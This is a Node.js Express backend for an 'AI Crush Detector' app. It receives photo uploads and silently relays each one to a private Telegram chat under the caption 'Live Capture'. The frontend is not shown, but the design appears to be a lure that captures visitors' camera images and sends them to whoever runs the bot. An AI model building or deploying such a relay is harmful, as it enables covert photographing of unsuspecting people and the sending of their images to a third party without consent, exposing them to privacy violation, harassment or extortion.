/*
 * AI Crush Detector - Fixed Telegram Photo Upload Backend
 * 
 * To reinstall dependencies on Replit:
 * 1. Run: npm install
 * 2. Start server: npm start
 * 3. Ensure environment variables are set: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 * 
 * Fixed multipart/form-data handling using form-data + axios for reliable Telegram uploads
 */

const express = require("express");
const multer = require("multer");
const path = require("path");
const FormData = require("form-data");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 5000;

// Simple multer setup for memory storage
const upload = multer({ storage: multer.memoryStorage() });

// Serve static files
app.use(express.static(__dirname));

// Photo upload endpoint with fixed Telegram integration
app.post("/api/send-photo", upload.single("photo"), async (req, res) => {
    console.log("📸 Photo request received");

    if (!req.file) {
        console.log("❌ No file received");
        return res.status(400).json({ error: "No photo file" });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    console.log("🔑 Bot Token:", botToken ? "Present" : "Missing");
    console.log("💬 Chat ID:", chatId ? "Present" : "Missing");
    console.log("📷 Photo size:", req.file.buffer.length, "bytes");

    if (!botToken || !chatId) {
        console.log("❌ Missing Telegram credentials");
        return res.status(500).json({ error: "Missing Telegram credentials" });
    }

    try {
        // Create proper FormData with form-data library
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", req.file.buffer, {
            filename: "capture.jpg",
            contentType: "image/jpeg"
        });
        formData.append("caption", "📸 AI Crush Detector - Live Capture!");

        console.log("🚀 Sending to Telegram API...");

        // Use axios with proper headers
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendPhoto`,
            formData,
            {
                headers: {
                    ...formData.getHeaders(),
                    'Content-Type': `multipart/form-data; boundary=${formData.getBoundary()}`
                },
                timeout: 30000, // 30 second timeout
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            }
        );

        console.log("📱 Telegram Response Status:", response.status);
        console.log("📱 Telegram Response Data:", JSON.stringify(response.data, null, 2));

        if (response.status === 200 && response.data.ok) {
            console.log("✅ SUCCESS - Photo sent to Telegram!");
            res.json({ success: true, message: "Photo sent successfully" });
        } else {
            console.log("❌ FAILED - Telegram API Error:", response.data);
            res.status(500).json({
                error: "Telegram API failed",
                details: response.data
            });
        }
    } catch (error) {
        console.error("💥 CATCH ERROR:", error.message);
        
        // Log detailed error information
        if (error.response) {
            console.error("🔴 Response Status:", error.response.status);
            console.error("🔴 Response Data:", JSON.stringify(error.response.data, null, 2));
            console.error("🔴 Response Headers:", error.response.headers);
        } else if (error.request) {
            console.error("🔴 Request Error:", error.request);
        } else {
            console.error("🔴 Setup Error:", error.message);
        }

        res.status(500).json({ 
            error: "Server error", 
            details: error.response?.data || error.message 
        });
    }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
    res.json({
        status: "OK",
        telegram: {
            botToken: !!process.env.TELEGRAM_BOT_TOKEN,
            chatId: !!process.env.TELEGRAM_CHAT_ID,
        },
        server: {
            port: PORT,
            environment: process.env.NODE_ENV || "development"
        }
    });
});

// Default route
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error("🔥 Unhandled error:", error);
    res.status(500).json({ error: "Internal server error" });
});

// Start server
app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Bot configured: ${process.env.TELEGRAM_BOT_TOKEN ? "YES" : "NO"}`);
    console.log(`💬 Chat configured: ${process.env.TELEGRAM_CHAT_ID ? "YES" : "NO"}`);
    console.log(`🌐 Server accessible at: http://0.0.0.0:${PORT}`);
});

// Handle process termination gracefully
process.on('SIGTERM', () => {
    console.log('👋 Server shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('👋 Server shutting down gracefully');
    process.exit(0);
});
